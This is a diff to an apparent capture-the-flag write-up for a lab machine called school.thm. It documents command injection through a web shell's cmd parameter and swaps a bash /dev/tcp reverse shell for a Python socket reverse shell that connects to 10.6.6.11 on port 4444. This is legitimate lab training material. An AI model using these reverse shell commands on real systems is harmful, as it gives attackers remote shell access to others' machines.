@@ -14,7 +14,8 @@
 1. http://school.thm/assets/index.php?cmd=whoami gives us d3d3LWRhdGEK
 2. base 64 decode shows user is www-data
 3. http://school.thm/assets/index.php?cmd=cat /etc/apache2/sites-enabled/000-default.conf reveals some info see apache_conf.txt
-4. we are able to reverse shell http://school.thm/assets/index.php?cmd=bash -i >& /dev/tcp/<attack ip>/4444 0>&1
+4. we are able to reverse shell http://school.thm/assets/index.php?cmd=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.6.6.11",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"]);'
+
 
 ## Reverse Shell
 
